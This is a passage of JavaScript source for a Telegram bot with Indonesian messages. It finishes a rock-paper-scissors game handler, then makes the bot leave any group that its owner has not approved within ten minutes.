    await ctx.editMessageText(`<blockquote>
🏆 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1.choice || game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

<i>Pemenang:</i>
<b>${suitName(winner)}</b>

⭐ +2 point
</blockquote>`, { parse_mode: "HTML" });
    suitGames.delete(chatId);
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

//------------------(DETEKSI BOT JOIN GB)--------------------//
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;
    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;
    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];
    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;
      await ctx.telegram.sendMessage(chat.id, "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis.");
      await ctx.telegram.sendMessage(ownerID, `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\nNama Group: ${chatTitle}\nChat ID: ${chatId}\n\nGunakan:\n/approved ${chatId}\n\nJika ingin mengizinkan bot aktif di group tersebut.`);
      if (pendingGroups.has(chatId)) clearTimeout(pendingGroups.get(chatId).timeout);
      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(chat.id, "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis.");
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) { console.error("Gagal leave group:", e.message); }
        finally { pendingGroups.delete(chatId); }
      }, 10 * 60 * 1000);
      pendingGroups.set(chatId, { title: chatTitle, timeout });
    }
  } catch (err) { console.error("Error my_chat_member:", err.message); }
});

bot.launch();
console.log("🚀 Bot Hefaistos Hades aktif!");